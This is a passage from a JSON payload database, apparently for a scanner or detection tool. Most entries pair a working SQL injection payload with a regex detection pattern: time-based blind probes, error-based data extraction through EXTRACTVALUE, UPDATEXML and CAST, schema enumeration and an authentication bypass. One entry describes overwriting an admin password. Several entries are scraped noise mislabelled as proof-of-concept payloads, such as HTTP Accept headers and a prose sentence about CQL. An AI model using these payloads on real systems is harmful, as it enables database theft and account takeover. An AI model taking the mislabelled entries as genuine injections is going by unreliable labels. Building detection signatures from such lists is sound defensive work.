      "name": "SQLI 2100935' OR IF(MID(@@version,1,1)='4',sl [7b27b9c4]",
      "payload": "2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "2100935'\\ OR\\ IF\\(MID\\(@@version,1,1\\)='4',sleep\\(1\\),1\\)='2",
      "tags": [
        "enumeration",
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI 2100935' OR IF(MID(@@version,1,1)='5',sl [c045dc87]",
      "payload": "2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "2100935'\\ OR\\ IF\\(MID\\(@@version,1,1\\)='5',sleep\\(1\\),1\\)='2",
      "tags": [
        "enumeration",
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI 3. In the username and password fields,  [42d78911]",
      "payload": "3.\tIn the username and password fields, insert the following SQL Injection payload shown inside brackets to bypass authentication: {' or 1=1 #}.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "3\\.\\\tIn\\ the\\ username\\ and\\ password\\ fields,\\ insert\\ the\\ following\\ SQL\\ Injection\\ payload\\ shown\\ inside\\ brackets\\ to\\ bypass\\ authentication:\\ \\{'\\ or\\ 1=1\\ \\#\\}\\.",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ;(select 1 from pg_sleep(5)) [c2046575]",
      "payload": ";(select 1 from pg_sleep(5))",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": ";\\(select\\ 1\\ from\\ pg_sleep\\(5\\)\\)",
      "tags": [
        "postgres",
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3 [c6a7e91c]",
      "payload": "?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\?id=1\\ AND\\ EXTRACTVALUE\\(RAND\\(\\),CONCAT\\(0X3A,\\(SELECT\\ CONCAT\\(CHAR\\(126\\),column_name,CHAR\\(126\\)\\)\\ FROM\\ information_schema\\.columns\\ WHERE\\ TABLE_NAME=data_table\\ LIMIT\\ data_offset,1\\)\\)\\)\\-\\-",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3 [076d97e7]",
      "payload": "?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\?id=1\\ AND\\ EXTRACTVALUE\\(RAND\\(\\),CONCAT\\(0X3A,\\(SELECT\\ CONCAT\\(CHAR\\(126\\),data_column,CHAR\\(126\\)\\)\\ FROM\\ data_schema\\.data_table\\ LIMIT\\ data_offset,1\\)\\)\\)\\-\\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3 [92404248]",
      "payload": "?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\?id=1\\ AND\\ EXTRACTVALUE\\(RAND\\(\\),CONCAT\\(0X3A,\\(SELECT\\ CONCAT\\(CHAR\\(126\\),schema_name,CHAR\\(126\\)\\)\\ FROM\\ information_schema\\.schemata\\ LIMIT\\ data_offset,1\\)\\)\\)\\-\\-",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3 [a95cd542]",
      "payload": "?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\?id=1\\ AND\\ EXTRACTVALUE\\(RAND\\(\\),CONCAT\\(0X3A,\\(SELECT\\ CONCAT\\(CHAR\\(126\\),table_name,CHAR\\(126\\)\\)\\ FROM\\ information_schema\\.TABLES\\ WHERE\\ table_schema=data_column\\ LIMIT\\ data_offset,1\\)\\)\\)\\-\\-",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHA [df9a9eab]",
      "payload": "?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\?id=1\\ AND\\ EXTRACTVALUE\\(RAND\\(\\),CONCAT\\(CHAR\\(126\\),VERSION\\(\\),CHAR\\(126\\)\\)\\)\\-\\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ?id=1 AND IF(ASCII(SUBSTRING((SELECT USE [3822e75d]",
      "payload": "?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\?id=1\\ AND\\ IF\\(ASCII\\(SUBSTRING\\(\\(SELECT\\ USER\\(\\)\\),\\ 1,\\ 1\\)\\)>=100,\\ 1,\\ SLEEP\\(3\\)\\)\\ \\-\\-",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ?id=1 AND IF(ASCII(SUBSTRING((SELECT USE [9c813ac3]",
      "payload": "?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\?id=1\\ AND\\ IF\\(ASCII\\(SUBSTRING\\(\\(SELECT\\ USER\\(\\)\\),1,1\\)\\)>=100,1,\\ BENCHMARK\\(2000000,MD5\\(NOW\\(\\)\\)\\)\\)\\ \\-\\-",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ?id=1 AND SELECT SUBSTR(column_name,1,1) [dbdc6bdf]",
      "payload": "?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\?id=1\\ AND\\ SELECT\\ SUBSTR\\(column_name,1,1\\)\\ FROM\\ information_schema\\.columns\\ >\\ 'A'",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ?id=1 AND SELECT SUBSTR(table_name,1,1)  [2edad68d]",
      "payload": "?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\?id=1\\ AND\\ SELECT\\ SUBSTR\\(table_name,1,1\\)\\ FROM\\ information_schema\\.tables\\ >\\ 'A'",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ?id=1 OR IF(MID(@@version,1,1)='5',sleep [0c8b66eb]",
      "payload": "?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\?id=1\\ OR\\ IF\\(MID\\(@@version,1,1\\)='5',sleep\\(1\\),1\\)='2",
      "tags": [
        "enumeration",
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR' [b1982f56]",
      "payload": "AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "AND\\ 'RANDSTR'\\|\\|PG_SLEEP\\(10\\)='RANDSTR'",
      "tags": [
        "postgres",
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI AND (SELECT 1337 FROM (SELECT(SLEEP(10-( [a2b67aed]",
      "payload": "AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "AND\\ \\(SELECT\\ 1337\\ FROM\\ \\(SELECT\\(SLEEP\\(10\\-\\(IF\\(\\(1=1\\),0,10\\)\\)\\)\\)\\)\\ RANDSTR\\)",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI AND (SELECT 6301 FROM (SELECT(SLEEP(15)) [105424cd]",
      "payload": "AND (SELECT 6301 FROM (SELECT(SLEEP(15)))MFgI)-- HCqY",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "AND\\ \\(SELECT\\ 6301\\ FROM\\ \\(SELECT\\(SLEEP\\(15\\)\\)\\)MFgI\\)\\-\\-\\ HCqY",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI AND LEN(SELECT TOP 1 username FROM tblus [e2241d25]",
      "payload": "AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "AND\\ LEN\\(SELECT\\ TOP\\ 1\\ username\\ FROM\\ tblusers\\)=5\\ ;\\ \\-\\-\\ \\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI AND SELECT SUBSTRING(table_name,1,1) FRO [d5ceac40]",
      "payload": "AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "AND\\ SELECT\\ SUBSTRING\\(table_name,1,1\\)\\ FROM\\ information_schema\\.tables\\ >\\ 'A'",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI AND SLEEP(10)=0 [52c94f4b]",
      "payload": "AND SLEEP(10)=0",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "AND\\ SLEEP\\(10\\)=0",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT [d5577ef5]",
      "payload": "AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "AND\\ UPDATEXML\\(rand\\(\\),CONCAT\\(0x3a,\\(SELECT\\ CONCAT\\(CHAR\\(126\\),TABLE_NAME,CHAR\\(126\\)\\)\\ FROM\\ information_schema\\.TABLES\\ WHERE\\ table_schema=data_column\\ LIMIT\\ data_offset,1\\)\\),null\\)\\-\\-",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT [c7d1f5b9]",
      "payload": "AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "AND\\ UPDATEXML\\(rand\\(\\),CONCAT\\(0x3a,\\(SELECT\\ CONCAT\\(CHAR\\(126\\),column_name,CHAR\\(126\\)\\)\\ FROM\\ information_schema\\.columns\\ WHERE\\ TABLE_NAME=data_table\\ LIMIT\\ data_offset,1\\)\\),null\\)\\-\\-",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT [f6808f3d]",
      "payload": "AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "AND\\ UPDATEXML\\(rand\\(\\),CONCAT\\(0x3a,\\(SELECT\\ CONCAT\\(CHAR\\(126\\),data_info,CHAR\\(126\\)\\)\\ FROM\\ data_table\\.data_column\\ LIMIT\\ data_offset,1\\)\\),null\\)\\-\\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT [292eab70]",
      "payload": "AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "AND\\ UPDATEXML\\(rand\\(\\),CONCAT\\(0x3a,\\(SELECT\\ CONCAT\\(CHAR\\(126\\),schema_name,CHAR\\(126\\)\\)\\ FROM\\ information_schema\\.schemata\\ LIMIT\\ data_offset,1\\)\\),null\\)\\-\\-",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI AND UPDATEXML(rand(),CONCAT(CHAR(126),ve [37ba194b]",
      "payload": "AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "AND\\ UPDATEXML\\(rand\\(\\),CONCAT\\(CHAR\\(126\\),version\\(\\),CHAR\\(126\\)\\),null\\)\\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_ [8ac14ce9]",
      "payload": "AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "AND\\ \\[RANDNUM\\]=\\(SELECT\\ \\[RANDNUM\\]\\ FROM\\ PG_SLEEP\\(\\[SLEEPTIME\\]\\)\\)",
      "tags": [
        "postgres",
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI AND [RANDNUM]=BENCHMARK([SLEEPTIME]00000 [17a38b56]",
      "payload": "AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "AND\\ \\[RANDNUM\\]=BENCHMARK\\(\\[SLEEPTIME\\]000000,MD5\\('\\[RANDSTR\\]'\\)\\)",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Accept: text/html,application/xhtml+xml, [4519aa96]",
      "payload": "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Accept:\\ text/html,application/xhtml\\+xml,application/xml;q=0\\.9,image/avif,image/webp,\\*/\\*;q=0\\.8",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Accept: text/html,application/xhtml+xml, [f6c70133]",
      "payload": "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Accept:\\ text/html,application/xhtml\\+xml,application/xml;q=0\\.9,image/avif,image/webp,image/apng,\\*/\\*;q=0\\.8,application/signed\\-exchange;v=b3;q=0\\.9",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Accept: text/html,application/xhtml+xml, [fdb7554e]",
      "payload": "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Accept:\\ text/html,application/xhtml\\+xml,application/xml;q=0\\.9,image/webp,image/apng,\\*/\\*;q=0\\.8",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Another limitation is the absence of the [263c4222]",
      "payload": "Another limitation is the absence of the OR operator in CQL, which prevents creating always-true conditions; for instance, a query like SELECT * FROM table WHERE col1='a' OR col2='b'; will be rejected.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Another\\ limitation\\ is\\ the\\ absence\\ of\\ the\\ OR\\ operator\\ in\\ CQL,\\ which\\ prevents\\ creating\\ always\\-true\\ conditions;\\ for\\ instance,\\ a\\ query\\ like\\ SELECT\\ \\*\\ FROM\\ table\\ WHERE\\ col1='a'\\ OR\\ col2='b';\\ will\\ be\\ rejected\\.",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Because this row already exists, the ON  [7ad3dd88]",
      "payload": "Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the password column of the already existing row to \"P@ssw0rd\". After this, we can simply authenticate with \"admin@example.com\" and the password \"P@ssw0rd\".",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Because\\ this\\ row\\ already\\ exists,\\ the\\ ON\\ DUPLICATE\\ KEY\\ UPDATE\\ keyword\\ tells\\ MySQL\\ to\\ update\\ the\\ password\\ column\\ of\\ the\\ already\\ existing\\ row\\ to\\ \"P@ssw0rd\"\\.\\ After\\ this,\\ we\\ can\\ simply\\ authenticate\\ with\\ \"admin@example\\.com\"\\ and\\ the\\ password\\ \"P@ssw0rd\"\\.",
      "tags": [
        "mysql"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI CAST AND (CAST('~'||(SELECT version()):: [6a86dddd]",
      "payload": "CAST\tAND (CAST('~'||(SELECT version())::text||'~' AS NUMERIC)) -- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "CAST\\\tAND\\ \\(CAST\\('\\~'\\|\\|\\(SELECT\\ version\\(\\)\\)::text\\|\\|'\\~'\\ AS\\ NUMERIC\\)\\)\\ \\-\\-\\ \\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI CAST AND (SELECT version())::int=1 -- - [44bd1b5d]",
      "payload": "CAST\tAND (SELECT version())::int=1 -- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "CAST\\\tAND\\ \\(SELECT\\ version\\(\\)\\)::int=1\\ \\-\\-\\ \\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI CAST AND 1337=CAST('~'||(SELECT version( [9ba14d18]",
      "payload": "CAST\tAND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC) -- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "CAST\\\tAND\\ 1337=CAST\\('\\~'\\|\\|\\(SELECT\\ version\\(\\)\\)::text\\|\\|'\\~'\\ AS\\ NUMERIC\\)\\ \\-\\-\\ \\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI CAST AND CAST((SELECT version()) AS INT) [efe51c98]",
      "payload": "CAST\tAND CAST((SELECT version()) AS INT)=1337 -- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "CAST\\\tAND\\ CAST\\(\\(SELECT\\ version\\(\\)\\)\\ AS\\ INT\\)=1337\\ \\-\\-\\ \\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI CAST CAST((SELECT @@version) AS INT) [6b3d56c1]",
      "payload": "CAST\tCAST((SELECT @@version) AS INT)",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "CAST\\\tCAST\\(\\(SELECT\\ @@version\\)\\ AS\\ INT\\)",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI CAST(chr(126)||(SELECT column_name FROM  [09bf596a]",
      "payload": "CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "CAST\\(chr\\(126\\)\\|\\|\\(SELECT\\ column_name\\ FROM\\ information_schema\\.columns\\ WHERE\\ table_name='data_table'\\ LIMIT\\ 1\\ OFFSET\\ data_offset\\)\\|\\|chr\\(126\\)\\ AS\\ NUMERIC\\)\\-\\-",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI CAST(chr(126)||(SELECT table_name FROM i [c5e37e3a]",
      "payload": "CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "CAST\\(chr\\(126\\)\\|\\|\\(SELECT\\ table_name\\ FROM\\ information_schema\\.tables\\ LIMIT\\ 1\\ offset\\ data_offset\\)\\|\\|chr\\(126\\)\\ AS\\ NUMERIC\\)\\-\\-",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI CONVERT AND 1337=CONVERT(INT,(SELECT '~' [eda26640]",
      "payload": "CONVERT\tAND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "CONVERT\\\tAND\\ 1337=CONVERT\\(INT,\\(SELECT\\ '\\~'\\+\\(SELECT\\ @@version\\)\\+'\\~'\\)\\)\\ \\-\\-\\ \\-",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Column message exists in table log_table [9ff7a313]",
      "payload": "Column message exists in table log_table\tSELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Column\\ message\\ exists\\ in\\ table\\ log_table\\\tSELECT\\ COUNT\\(\\*\\)\\ FROM\\ user_tab_cols\\ WHERE\\ column_name\\ =\\ 'MESSAGE'\\ AND\\ table_name\\ =\\ 'LOG_TABLE';",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Count Number Of Tables AND (SELECT count [40728ad9]",
      "payload": "Count Number Of Tables\tAND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Count\\ Number\\ Of\\ Tables\\\tAND\\ \\(SELECT\\ count\\(tbl_name\\)\\ FROM\\ sqlite_master\\ WHERE\\ type='table'\\ AND\\ tbl_name\\ NOT\\ LIKE\\ 'sqlite_%'\\ \\)\\ <\\ number_of_table",
      "tags": [
        "sqlite"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI DBMS version SELECT @@version [8fdc2a2b]",
      "payload": "DBMS version\tSELECT @@version",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "DBMS\\ version\\\tSELECT\\ @@version",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI DBMS version SELECT user FROM dual UNION [eb014d53]",
      "payload": "DBMS version\tSELECT user FROM dual UNION SELECT * FROM v$version",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "DBMS\\ version\\\tSELECT\\ user\\ FROM\\ dual\\ UNION\\ SELECT\\ \\*\\ FROM\\ v\\$version",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI DBMS_UTILITY AND 1337=DBMS_UTILITY.SQLID [810f5b9c]",
      "payload": "DBMS_UTILITY\tAND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT banner FROM v$version)||'~') -- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "DBMS_UTILITY\\\tAND\\ 1337=DBMS_UTILITY\\.SQLID_TO_SQLHASH\\('\\~'\\|\\|\\(SELECT\\ banner\\ FROM\\ v\\$version\\)\\|\\|'\\~'\\)\\ \\-\\-\\ \\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI EQUAL AND 1337=CONCAT('~',(SELECT @@vers [b88ea958]",
      "payload": "EQUAL\tAND 1337=CONCAT('~',(SELECT @@version),'~') -- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "EQUAL\\\tAND\\ 1337=CONCAT\\('\\~',\\(SELECT\\ @@version\\),'\\~'\\)\\ \\-\\-\\ \\-",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI EXP AND EXP(~(SELECT * FROM (SELECT CONC [71eed5a3]",
      "payload": "EXP\tAND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "EXP\\\tAND\\ EXP\\(\\~\\(SELECT\\ \\*\\ FROM\\ \\(SELECT\\ CONCAT\\('\\~',\\(SELECT\\ version\\(\\)\\),'\\~','x'\\)\\)x\\)\\)\\ \\-\\-\\ \\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI EXTRACTVALUE AND EXTRACTVALUE(1337,CONCA [ca76d907]",
